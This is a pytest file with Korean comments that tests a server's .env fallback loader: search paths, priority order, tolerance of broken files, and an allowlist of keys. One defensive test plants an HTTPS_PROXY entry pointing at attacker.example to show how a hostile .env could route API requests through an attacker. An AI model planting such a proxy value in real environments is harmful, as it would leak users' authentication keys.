"""`.env` 폴백 — 탐색 경로가 cwd 에만 묶이지 않는지 테스트.

개조 전에는 cwd(+상위 3단계)만 뒤졌다. 서버를 다른 폴더에서 띄우면(등록 파일이
아닌 임의 경로, 런처, 크론 등) 키를 못 찾아 전 도구가 CONFIG_ERROR 로 죽었다.
"""

from __future__ import annotations

import os
from pathlib import Path

import pytest

from deal_locator import server as S

KEYS = ("DEAL_LOCATOR_SERVICE_KEY", "DATA_GO_KR_API_KEY", "DEAL_LOCATOR_ENV_FILE")


@pytest.fixture(autouse=True)
def _clean_env():
    """이 파일은 .env 를 실제로 os.environ 에 주입한다 — 통째로 복원해 격리한다."""
    snapshot = dict(os.environ)
    for k in KEYS:
        os.environ.pop(k, None)
    yield
    os.environ.clear()
    os.environ.update(snapshot)


def _write_env(d: Path, body: str) -> Path:
    p = d / ".env"
    p.write_text(body, encoding="utf-8")
    return p


def test_explicit_env_file_wins_regardless_of_cwd(tmp_path: Path,
                                                  monkeypatch: pytest.MonkeyPatch) -> None:
    """DEAL_LOCATOR_ENV_FILE 은 cwd 와 무관하게 항상 통한다."""
    far = tmp_path / "somewhere" / "keys.env"
    far.parent.mkdir(parents=True)
    far.write_text('DEAL_LOCATOR_SERVICE_KEY="explicit-key"\n', encoding="utf-8")

    empty = tmp_path / "empty"
    empty.mkdir()
    monkeypatch.chdir(empty)
    monkeypatch.setenv("DEAL_LOCATOR_ENV_FILE", str(far))

    S._load_dotenv_fallback()
    assert os.environ["DEAL_LOCATOR_SERVICE_KEY"] == "explicit-key"


def test_cwd_env_is_still_loaded(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    """기존 관행(.mcp.json 폴더에서 띄우기)이 깨지지 않아야 한다."""
    _write_env(tmp_path, "DATA_GO_KR_API_KEY=cwd-key\n")
    monkeypatch.chdir(tmp_path)
    S._load_dotenv_fallback()
    assert os.environ["DATA_GO_KR_API_KEY"] == "cwd-key"


def test_search_continues_past_keyless_env(tmp_path: Path,
                                           monkeypatch: pytest.MonkeyPatch) -> None:
    """키 없는 .env 를 만나도 포기하지 않는다 (개조 전엔 첫 파일에서 멈췄다)."""
    parent = tmp_path / "proj"
    child = parent / "sub"
    child.mkdir(parents=True)
    _write_env(child, "# 주석만 있고 키는 없음\n")
    _write_env(parent, "DEAL_LOCATOR_SERVICE_KEY=parent-key\n")

    monkeypatch.chdir(child)
    S._load_dotenv_fallback()
    assert os.environ["DEAL_LOCATOR_SERVICE_KEY"] == "parent-key"


# ── 보안 계약 (2026-07-22 감사 반영) ───────────────────────────────────

def test_허용목록_밖의_키는_무시한다(tmp_path: Path,
                                monkeypatch: pytest.MonkeyPatch) -> None:
    """.env 를 통째로 환경변수에 올리면 안 된다.

    HTTPS_PROXY 가 섞여 들어오면 data.go.kr 요청이 공격자 서버를 경유하고
    인증키가 새어나간다. 남의 리포 안에서 서버를 띄우는 것만으로 성립한다.
    """
    monkeypatch.delenv("HTTPS_PROXY", raising=False)
    _write_env(tmp_path, "HTTPS_PROXY=http://attacker.example:8080\n"
                         "OTHER=1\n"
                         "DEAL_LOCATOR_SERVICE_KEY=ok-key\n")
    monkeypatch.chdir(tmp_path)
    S._load_dotenv_fallback()

    assert os.environ["DEAL_LOCATOR_SERVICE_KEY"] == "ok-key", "허용된 키는 읽어야 한다"
    assert "HTTPS_PROXY" not in os.environ, "프록시 주입이 통과했다 — 인증키 유출 경로"
    assert "OTHER" not in os.environ


def test_설치위치는_탐색하지_않는다(tmp_path: Path,
                                monkeypatch: pytest.MonkeyPatch) -> None:
    """site-packages 상위를 훑으면 무관한 .env 를 삼킨다 — 탐색 대상에서 제외."""
    empty = tmp_path / "elsewhere"
    empty.mkdir()
    monkeypatch.chdir(empty)

    install_root = Path(S.__file__).resolve().parents[2]
    assert install_root / ".env" not in S._env_candidates()


def test_탐색범위는_cwd_상위1단계와_홈_고정경로뿐(monkeypatch: pytest.MonkeyPatch) -> None:
    """cwd 계열은 상위 1단계까지, 그 뒤는 홈의 고정 경로 2개.

    홈 경로는 조상 디렉터리 훑기가 아니라 사용자 소유의 고정 파일이라 남의 .env 를
    삼킬 수 없다. 플러그인/Desktop 설치는 cwd 가 예측 불가해 이 경로가 필요하다.
    """
    monkeypatch.delenv("DEAL_LOCATOR_ENV_FILE", raising=False)
    home = Path.home()
    assert S._env_candidates() == [
        Path.cwd() / ".env",
        Path.cwd().parent / ".env",
        home / ".deal-locator.env",
        home / ".config" / "deal-locator" / ".env",
    ]


def test_홈_경로는_프로젝트_env_보다_뒤다(monkeypatch: pytest.MonkeyPatch) -> None:
    """우선순위 역전 방지 — 프로젝트에서 띄우면 프로젝트 .env 가 이긴다."""
    monkeypatch.delenv("DEAL_LOCATOR_ENV_FILE", raising=False)
    cands = S._env_candidates()

    assert cands.index(Path.cwd() / ".env") < cands.index(Path.home() / ".deal-locator.env")
    assert cands.index(Path.cwd().parent / ".env") < cands.index(
        Path.home() / ".config" / "deal-locator" / ".env"
    )


def test_existing_env_vars_are_never_overwritten(tmp_path: Path,
                                                 monkeypatch: pytest.MonkeyPatch) -> None:
    _write_env(tmp_path, "DEAL_LOCATOR_SERVICE_KEY=from-file\n")
    monkeypatch.chdir(tmp_path)
    monkeypatch.setenv("DEAL_LOCATOR_SERVICE_KEY", "from-shell")
    S._load_dotenv_fallback()
    assert os.environ["DEAL_LOCATOR_SERVICE_KEY"] == "from-shell"


def test_candidates_are_deduped_and_ordered(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.delenv("DEAL_LOCATOR_ENV_FILE", raising=False)
    cands = S._env_candidates()
    assert len(cands) == len(set(cands))
    # 홈 후보 하나는 `.deal-locator.env` 라 이름이 다르다 — 숨김 파일인 것만 보장한다.
    assert all(p.name.startswith(".") for p in cands)
    assert cands[0] == Path.cwd() / ".env"  # 명시 지정이 없으면 cwd 가 첫 후보


def test_unreadable_env_does_not_crash(tmp_path: Path,
                                       monkeypatch: pytest.MonkeyPatch) -> None:
    """.env 가 디렉터리이거나 깨진 바이트여도 서버 기동을 막지 않는다.

    실제 탐색 경로엔 이 리포 옆 .env(키 보유)가 들어오므로, 로더 자체의
    내성만 보도록 후보를 tmp 로 한정한다.
    """
    bad_dir = tmp_path / "as-dir"
    bad_dir.mkdir()
    (bad_dir / ".env").mkdir()                       # 파일이 아니라 디렉터리
    broken = tmp_path / "broken"
    broken.mkdir()
    (broken / ".env").write_bytes(b"\xff\xfe not utf-8 \x00")

    monkeypatch.setattr(S, "_env_candidates",
                        lambda: [bad_dir / ".env", broken / ".env"])
    S._load_dotenv_fallback()                        # 예외 없이 통과
    assert not S._key_ok()                           # 키는 여전히 없음
